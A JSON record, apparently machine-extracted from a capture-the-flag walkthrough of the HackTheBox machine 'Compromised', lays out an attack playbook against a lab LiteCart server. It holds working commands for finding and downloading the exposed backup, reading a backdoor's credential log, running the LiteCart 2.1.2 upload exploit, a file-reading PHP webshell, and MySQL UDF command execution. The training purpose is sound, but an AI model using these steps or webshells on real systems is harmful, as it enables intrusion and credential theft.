@@ -1,0 +1,982 @@
+{
+  "writeup_id": "Htb_Compromised",
+  "scenario_fingerprint": {
+    "scenario_name": "compromised_web_application_forensics",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+apache",
+    "os_family": "linux",
+    "environment_type": "web_server",
+    "entry_vector": "backdoor_analysis",
+    "privilege_path": "www-data_to_mysql_to_root",
+    "attack_complexity": "hard",
+    "estimated_time": "3-4 hours",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "pre_compromised_system",
+      "backup_file_disclosure",
+      "credential_logging_backdoor",
+      "multiple_privilege_escalation_backdoors"
+    ],
+    "environmental_clues": [
+      "litecart_ecommerce_platform",
+      "backup_directory_exposed",
+      "webshell_artifacts",
+      "credential_harvesting_logs"
+    ],
+    "similar_scenarios": [
+      "postman_htb_hard",
+      "sneakymailer_htb_medium"
+    ],
+    "unique_aspects": [
+      "forensic_investigation_required",
+      "pam_backdoor",
+      "ldpreload_backdoor",
+      "strace_keylogger",
+      "disabled_php_functions"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Backup File Discovery",
+        "success_reason": "Website backup exposed source code and revealed backdoor evidence",
+        "prerequisite_indicators": [
+          "directory_listing_enabled",
+          "backup_files_accessible",
+          "web_server_misconfiguration"
+        ],
+        "recognition_patterns": [
+          "backup directories (/backup, /backups)",
+          "archive files (.tar.gz, .zip, .bak)",
+          "directory listing enabled"
+        ],
+        "failure_modes": [
+          "directory_listing_disabled",
+          "backup_files_removed",
+          "proper_access_controls"
+        ],
+        "environmental_factors": [
+          "poor_operational_security",
+          "incomplete_cleanup_after_compromise",
+          "default_apache_configuration"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "Credential Harvesting via Backdoor",
+        "success_reason": "Login form backdoored to log credentials to accessible file",
+        "prerequisite_indicators": [
+          "compromised_application",
+          "backdoor_logging_active",
+          "web_accessible_log_files"
+        ],
+        "recognition_patterns": [
+          "commented logging code in source",
+          "suspicious file_put_contents calls",
+          "hidden log files with predictable names"
+        ],
+        "failure_modes": [
+          "log_files_cleaned_up",
+          "backdoor_code_removed",
+          "proper_file_permissions"
+        ],
+        "environmental_factors": [
+          "previously_compromised_system",
+          "attacker_persistence_mechanisms",
+          "insufficient_incident_response"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "LiteCart File Upload Exploit",
+        "success_reason": "Vulnerable LiteCart 2.1.2 with admin credentials obtained",
+        "prerequisite_indicators": [
+          "litecart_version_2.1.2",
+          "admin_panel_accessible",
+          "vqmods_functionality_enabled"
+        ],
+        "recognition_patterns": [
+          "LiteCart branding visible",
+          "version info in admin panel",
+          "vQmods upload interface"
+        ],
+        "failure_modes": [
+          "php_execution_functions_disabled",
+          "file_upload_restrictions",
+          "admin_access_unavailable"
+        ],
+        "environmental_factors": [
+          "unpatched_application",
+          "default_php_configuration_modified",
+          "security_hardening_incomplete"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "20-45 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Backdoored login form with credential logging",
+        "discovery_method": "Source code analysis in backup files",
+        "why_critical": "Provided admin credentials for application exploitation",
+        "how_to_recognize": [
+          "file_put_contents in login handlers",
+          "commented logging code",
+          "suspicious log file patterns"
+        ],
+        "follow_up_actions": [
+          "check_log_file_accessibility",
+          "test_credentials_on_admin_panel",
+          "look_for_other_backdoors"
+        ]
+      },
+      {
+        "discovery": "Admin credentials admin:theNextGenSt0r3!~",
+        "discovery_method": "Accessing backdoor log file .log2301c9430d8593ae.txt",
+        "why_critical": "Enabled exploitation of LiteCart file upload vulnerability",
+        "how_to_recognize": [
+          "credential format in log files",
+          "admin panel login success",
+          "access to privileged functions"
+        ],
+        "follow_up_actions": [
+          "exploit_file_upload_vulnerability",
+          "enumerate_application_features",
+          "check_for_other_admin_functions"
+        ]
+      },
+      {
+        "discovery": "PHP execution functions disabled",
+        "discovery_method": "Webshell returning empty responses",
+        "why_critical": "Required alternative exploitation methods for code execution",
+        "how_to_recognize": [
+          "empty responses from webshells",
+          "system() function not working",
+          "disabled_functions in phpinfo"
+        ],
+        "follow_up_actions": [
+          "enumerate_available_php_functions",
+          "look_for_database_access",
+          "find_alternative_execution_methods"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "web_application_admin",
+        "escalation_method": "File_upload_to_webshell",
+        "why_possible": "LiteCart vQmods allows arbitrary file upload with admin access",
+        "recognition_signs": [
+          "admin_panel_access_available",
+          "vqmods_upload_functionality",
+          "client_side_filtering_only"
+        ],
+        "exploitation_path": "Admin Login → vQmods Upload → PHP Webshell → System Access"
+      },
+      {
+        "privilege_level": "www-data",
+        "escalation_method": "Database_access_to_mysql_user",
+        "why_possible": "PHP functions disabled but database access available, mysql user shell enabled",
+        "recognition_signs": [
+          "database_credentials_in_config",
+          "mysql_user_shell_enabled",
+          "alternative_execution_methods_needed"
+        ],
+        "exploitation_path": "Webshell → Database Access → MySQL User → System Shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only ports 22 (SSH) and 80 (HTTP) open on Linux host",
+        "decision": "Focus on web application enumeration and exploitation",
+        "reasoning": "Limited attack surface requires thorough web app analysis",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_brute_force",
+            "when": "if web exploitation fails"
+          },
+          {
+            "option": "version_specific_ssh_exploits",
+            "when": "if OpenSSH 7.6p1 vulns found"
+          }
+        ],
+        "success_indicators": [
+          "web_application_identified",
+          "directory_enumeration_complete",
+          "backup_files_found"
+        ],
+        "next_decision": "analyze_web_application_stack"
+      },
+      {
+        "step": 2,
+        "situation": "Identified LiteCart e-commerce platform with backup directory",
+        "decision": "Download and analyze backup files before attempting direct exploitation",
+        "reasoning": "Backup files often contain credentials, config files, and reveal attack vectors",
+        "confidence": 0.95,
+        "prerequisites": [
+          "backup_directory_accessible"
+        ],
+        "success_indicators": [
+          "credentials_found",
+          "backdoors_discovered",
+          "config_files_analyzed"
+        ],
+        "failure_fallbacks": [
+          "version_specific_exploits",
+          "default_credentials"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Found backdoored login.php logging credentials to hidden file",
+        "decision": "Check for credential log file on live system",
+        "reasoning": "Compromised box theme suggests attacker left monitoring backdoors",
+        "confidence": 0.85,
+        "prerequisites": [
+          "backup_analysis_complete"
+        ],
+        "success_indicators": [
+          "credential_log_accessible",
+          "admin_credentials_obtained"
+        ],
+        "failure_fallbacks": [
+          "litecart_exploit_without_creds",
+          "sql_injection_attempts"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Obtained admin credentials and confirmed LiteCart 2.1.2",
+        "decision": "Use authenticated file upload vulnerability in vQmods",
+        "reasoning": "Known CVE with public exploit available for exact version",
+        "confidence": 0.9,
+        "prerequisites": [
+          "admin_access_confirmed",
+          "version_2.1.2_confirmed"
+        ],
+        "success_indicators": [
+          "file_upload_successful",
+          "webshell_accessible"
+        ],
+        "failure_fallbacks": [
+          "manual_upload_via_burp",
+          "alternative_upload_vectors"
+        ]
+      },
+      {
+        "step": 5,
+        "situation": "Webshell uploaded but system() function disabled",
+        "decision": "Use alternative PHP functions for code execution and enumeration",
+        "reasoning": "disable_functions bypass or alternative execution methods needed",
+        "confidence": 0.8,
+        "alternatives": [
+          {
+            "option": "file_read_enumeration",
+            "when": "if execution completely blocked"
+          },
+          {
+            "option": "database_access",
+            "when": "if db credentials available"
+          },
+          {
+            "option": "disable_functions_bypass",
+            "when": "if bypass techniques work"
+          }
+        ],
+        "success_indicators": [
+          "file_system_access",
+          "database_connection",
+          "command_execution"
+        ],
+        "next_decision": "choose_privilege_escalation_vector"
+      }
+    ],
+    "branching_logic": {
+      "if_backup_found": {
+        "action": "analyze_backup_thoroughly",
+        "tools": [
+          "tar",
+          "grep",
+          "find"
+        ],
+        "next_phase": "credential_extraction"
+      },
+      "if_credentials_found": {
+        "action": "authenticate_and_exploit_known_vulns",
+        "tools": [
+          "searchsploit",
+          "burp",
+          "custom_scripts"
+        ],
+        "next_phase": "post_exploitation_enumeration"
+      },
+      "if_webshell_limited": {
+        "action": "use_alternative_php_functions",
+        "alternatives": [
+          "file_get_contents",
+          "scandir",
+          "mysqli_connect"
+        ],
+        "decision_criteria": "based_on_available_php_functions"
+      },
+      "if_database_access_obtained": {
+        "action": "enumerate_system_via_mysql",
+        "purpose": "find_privilege_escalation_paths",
+        "tools": [
+          "mysql_client",
+          "udf_exploits"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_backup_directories_first",
+        "reasoning": "high_probability_of_credentials_and_backdoor_discovery",
+        "applicability": "web_applications_with_backup_access"
+      },
+      {
+        "rule": "analyze_compromised_box_theme_for_attacker_artifacts",
+        "reasoning": "existing_compromise_provides_additional_attack_vectors",
+        "applicability": "boxes_with_compromise_theme"
+      },
+      {
+        "rule": "test_multiple_php_execution_methods_when_functions_disabled",
+        "reasoning": "disable_functions_often_incomplete_or_bypassable",
+        "applicability": "php_webshells_with_restricted_functions"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Web Backup File Analysis",
+        "mitre_id": "T1005",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_server_accessible",
+          "backup_files_present",
+          "directory_listing_enabled"
+        ],
+        "success_indicators": [
+          "tar_gz_files_found",
+          "zip_files_found",
+          "source_code_exposed",
+          "config_files_accessible"
+        ],
+        "incompatible_with": [
+          "directory_listing_disabled",
+          "backup_files_removed",
+          "proper_file_permissions"
+        ],
+        "confidence_boosters": [
+          "common_backup_naming_patterns",
+          "development_artifacts_present",
+          "version_control_exposed"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Backdoor Discovery",
+        "mitre_id": "T1505.003",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "source_code_accessible",
+          "previously_compromised_system"
+        ],
+        "success_indicators": [
+          "webshell_files_found",
+          "credential_loggers_present",
+          "suspicious_php_files",
+          "commented_logging_code"
+        ],
+        "incompatible_with": [
+          "clean_installation",
+          "regular_security_audits",
+          "file_integrity_monitoring"
+        ],
+        "confidence_boosters": [
+          "system_function_calls",
+          "credential_harvesting_code",
+          "hidden_log_files"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "LiteCart Exploitation",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "litecart_application_detected",
+          "admin_credentials_available",
+          "file_upload_functionality_present"
+        ],
+        "success_indicators": [
+          "litecart_version_2_1_2_detected",
+          "admin_panel_accessible",
+          "file_upload_successful"
+        ],
+        "incompatible_with": [
+          "php_execution_functions_disabled",
+          "file_upload_restrictions",
+          "updated_litecart_version"
+        ],
+        "confidence_boosters": [
+          "x_powered_by_litecart_header",
+          "litecart_logo_present",
+          "default_admin_paths"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "20-40 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "apache",
+          "nginx"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "nginx",
+          "IIS"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "litecart_platform": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "X-Powered-By: LiteCart",
+          "litecart logo",
+          "shop/en/ redirect"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "compromised_system": {
+        "port_indicators": [
+          22,
+          80,
+          443
+        ],
+        "service_indicators": [
+          "ssh",
+          "http"
+        ],
+        "artifact_indicators": [
+          "backup directories",
+          "log files",
+          "webshells",
+          "commented code"
+        ],
+        "confidence_threshold": 0.85
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "backup_file_enumeration",
+          "when": "web_service_detected",
+          "reason": "often_contains_source_code_and_credentials"
+        },
+        {
+          "attack": "credential_harvesting_log_check",
+          "when": "compromised_system_indicators_present",
+          "reason": "previous_attacker_may_have_left_credential_loggers"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "litecart_cve_exploitation",
+          "when": "litecart_detected_and_creds_available",
+          "reason": "known_file_upload_vulnerability_exists"
+        },
+        {
+          "attack": "webshell_discovery",
+          "when": "source_code_accessible",
+          "reason": "backdoors_commonly_left_by_previous_attackers"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Backup File Analysis",
+        "mitre_id": "T1005",
+        "category": "collection",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "gobuster",
+            "command_template": "gobuster dir -u {url} -w {wordlist} -x {extensions} -t {threads}",
+            "actual_command": "gobuster dir -u http://10.10.10.207 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -o scans/gobuster-root-small-php -t 30",
+            "output_pattern": "/backup (Status: 301)",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "curl",
+            "command_template": "curl {url}",
+            "actual_command": "curl http://10.10.10.207/backup/",
+            "success_factors": [
+              "directory_listing_enabled",
+              "backup_files_present"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "web_server_accessible",
+          "directory_listing_enabled",
+          "backup_files_exposed"
+        ],
+        "success_indicators": [
+          "backup_archive_found",
+          "source_code_extracted",
+          "configuration_files_discovered"
+        ],
+        "common_failures": [
+          "no_backup_directory",
+          "access_denied",
+          "empty_backup_folder"
+        ],
+        "follow_up_techniques": [
+          "source_code_analysis",
+          "credential_extraction",
+          "backdoor_identification"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Backdoor Credential Harvesting",
+        "mitre_id": "T1056.001",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "grep",
+            "command_template": "grep -r {pattern} {directory}",
+            "actual_command": "grep -r 'file_put_contents' shop/",
+            "output_pattern": "file_put_contents(\"./.log2301c9430d8593ae.txt\", \"User: \" . $_POST['username'] . \" Passwd: \" . $_POST['password']);",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "curl",
+            "command_template": "curl {url}/{log_file}",
+            "actual_command": "curl http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt",
+            "success_factors": [
+              "log_file_accessible",
+              "credentials_logged"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "source_code_access",
+          "backdoor_logging_enabled",
+          "log_file_web_accessible"
+        ],
+        "success_indicators": [
+          "login_backdoor_identified",
+          "credential_log_file_found",
+          "admin_credentials_extracted"
+        ],
+        "common_failures": [
+          "log_file_not_accessible",
+          "no_credentials_logged",
+          "backdoor_removed"
+        ],
+        "follow_up_techniques": [
+          "admin_panel_access",
+          "file_upload_exploitation",
+          "privilege_escalation"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "LiteCart File Upload Exploitation",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "LiteCart 2.1.2 Exploit",
+            "command_template": "python 45267.py -t {target_url} -u {username} -p {password}",
+            "actual_command": "python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'",
+            "output_pattern": "Shell => http://10.10.10.207/shop/admin/../vqmod/xml/{random}.php?c=id",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "admin_credentials_available",
+          "litecart_version_2.1.2",
+          "vqmods_functionality_enabled"
+        ],
+        "success_indicators": [
+          "file_upload_successful",
+          "webshell_accessible",
+          "code_execution_achieved"
+        ],
+        "common_failures": [
+          "disabled_php_functions",
+          "file_upload_restrictions",
+          "authentication_failure"
+        ],
+        "follow_up_techniques": [
+          "php_function_bypass",
+          "database_access",
+          "system_enumeration"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "PHP Function Restriction Bypass",
+        "mitre_id": "T1059.003",
+        "category": "execution",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "Custom PHP Script",
+            "command_template": "<?php if (isset($_REQUEST['file'])) { echo file_get_contents($_REQUEST['file']); } if (isset($_REQUEST['dir'])) { print_r(scandir($_REQUEST['dir'])); } ?>",
+            "actual_command": "curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/1FFFK.php --data-urlencode \"file=/etc/passwd\"",
+            "output_pattern": "root:x:0:0:root:/root:/bin/bash",
+            "effectiveness_rating": 4,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "webshell_upload_successful",
+          "system_exec_functions_disabled",
+          "file_read_functions_available"
+        ],
+        "success_indicators": [
+          "file_system_access_achieved",
+          "directory_enumeration_working",
+          "sensitive_files_readable"
+        ],
+        "common_failures": [
+          "all_php_functions_disabled",
+          "file_permissions_restrictive",
+          "open_basedir_restrictions"
+        ],
+        "follow_up_techniques": [
+          "database_exploitation",
+          "mysql_udf_abuse",
+          "credential_harvesting"
+        ],
+        "time_investment": "20-45 minutes",
+        "skill_level": "advanced"
+      },
+      {
+        "name": "MySQL UDF Command Execution",
+        "mitre_id": "T1059.004",
+        "category": "execution",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "MySQL Client via PHP",
+            "command_template": "$conn = new mysqli(\"localhost\", \"{user}\", \"{pass}\", \"{db}\"); mysqli_query($conn, \"{query}\");",
+            "actual_command": "$conn = new mysqli(\"localhost\", \"root\", \"changethis\", \"ecom\"); mysqli_query($conn, \"select exec_cmd('id')\");",
+            "output_pattern": "uid=111(mysql) gid=113(mysql)",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "database_credentials_available",
+          "mysql_udf_functions_installed",
+          "exec_cmd_function_exists"
+        ],
+        "success_indicators": [
+          "command_execution_via_mysql",
+          "mysql_user_shell_access",
+          "system_command_output_returned"
+        ],
+        "common_failures": [
+          "udf_functions_not_installed",
+          "database_access_denied",
+          "mysql_user_restricted"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "time_investment": "30-60 minutes",
+        "skill_level": "advanced"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "gobuster",
+        "use_case": "web_directory_enumeration",
+        "effectiveness_rating": 5,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "dirbuster",
+          "ffuf",
+          "dirb"
+        ],
+        "best_practices": [
+          "use_appropriate_wordlists",
+          "include_common_extensions",
+          "adjust_thread_count_for_stability"
+        ]
+      },
+      {
+        "tool": "searchsploit",
+        "use_case": "vulnerability_identification",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "low",
+        "essential_for": [
+          "exploit_development",
+          "vulnerability_assessment"
+        ],
+        "alternatives": [
+          "exploit-db_website",
+          "metasploit_search"
+        ],
+        "best_practices": [
+          "verify_version_compatibility",
+          "test_exploits_in_controlled_environment",
+          "modify_exploits_for_specific_targets"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "backup_to_admin_access",
+        "steps": [
+          {
+            "step": 1,
+            "command": "gobuster dir -u http://10.10.10.207 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 30",
+            "purpose": "Discover backup directory",
+            "expected_output": "/backup (Status: 301)"
+          },
+          {
+            "step": 2,
+            "command": "curl http://10.10.10.207/backup/",
+            "purpose": "List backup contents",
+            "expected_output": "a.tar.gz file listing"
+          },
+          {
+            "step": 3,
+            "command": "wget http://10.10.10.207/backup/a.tar.gz && tar -xzf a.tar.gz",
+            "purpose": "Download and extract backup",
+            "expected_output": "Website source code extracted"
+          },
+          {
+            "step": 4,
+            "command": "grep -r 'file_put_contents' shop/",
+            "purpose": "Find credential logging backdoor",
+            "expected_output": "Backdoor code in login.php"
+          },
+          {
+            "step": 5,
+            "command": "curl http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt",
+            "purpose": "Extract logged credentials",
+            "expected_output": "User: admin Passwd: theNextGenSt0r3!~"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "20-40 minutes"
+      },
+      {
+        "sequence_name": "litecart_to_mysql_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'",
+            "purpose": "Upload webshell via LiteCart vulnerability",
+            "expected_output": "Shell URL provided"
+          },
+          {
+            "step": 2,
+            "command": "curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/[shell].php --data-urlencode 'file=/etc/passwd'",
+            "purpose": "Enumerate system via file read",
+            "expected_output": "mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash"
+          },
+          {
+            "step": 3,
+            "command": "curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/[shell].php --data-urlencode 'db=select exec_cmd(\"id\")'",
+            "purpose": "Execute commands via MySQL UDF",
+            "expected_output": "uid=111(mysql) gid=113(mysql)"
+          }
+        ],
+        "success_rate": 0.78,
+        "typical_duration": "45-90 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Compromised",
+      "difficulty": "Hard",
+      "os": "Linux Ubuntu",
+      "platform": "HackTheBox",
+      "release_date": "2020-09-12",
+      "author": "D4nch3n",
+      "estimated_time": "4-6 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "high",
+      "skill_level_required": "advanced",
+      "primary_attack_vectors": [
+        "web_exploitation",
+        "backdoor_analysis",
+        "privilege_escalation"
+      ],
+      "key_vulnerabilities": [
+        "litecart_rce",
+        "pam_backdoor",
+        "ldpreload_backdoor",
+        "php_function_bypass"
+      ],
+      "environment_type": "compromised_web_server",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "incident_response",
+        "backdoor_detection",
+        "post_exploitation_analysis",
+        "php_security"
+      ],
+      "prerequisite_knowledge": [
+        "web_exploitation",
+        "linux_internals",
+        "php_security",
+        "forensic_analysis"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "backdoor_analysis",
+        "incident_response",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "initial_access",
+        "persistence",
+        "privilege_escalation",
+        "credential_access"
+      ],
+      "defensive_lessons": [
+        "backdoor_detection",
+        "system_monitoring",
+        "secure_coding",
+        "access_controls"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Sneaky",
+        "Poison",
+        "Nineveh"
+      ],
+      "similarity_reasons": [
+        "web_exploitation",
+        "multi_stage_attacks",
+        "backdoor_mechanisms"
+      ],
+      "unique_aspects": [
+        "pre_compromised_system",
+        "following_attacker_trail",
+        "multiple_backdoors",
+        "php_function_restrictions"
+      ],
+      "difficulty_factors": [
+        "complex_attack_chain",
+        "backdoor_identification",
+        "php_bypass_techniques",
+        "forensic_analysis_required"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T14:49:59.692355",
+    "original_file": "0xdf_writeups/Htb Compromised.md",
+    "content_length": 41014,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
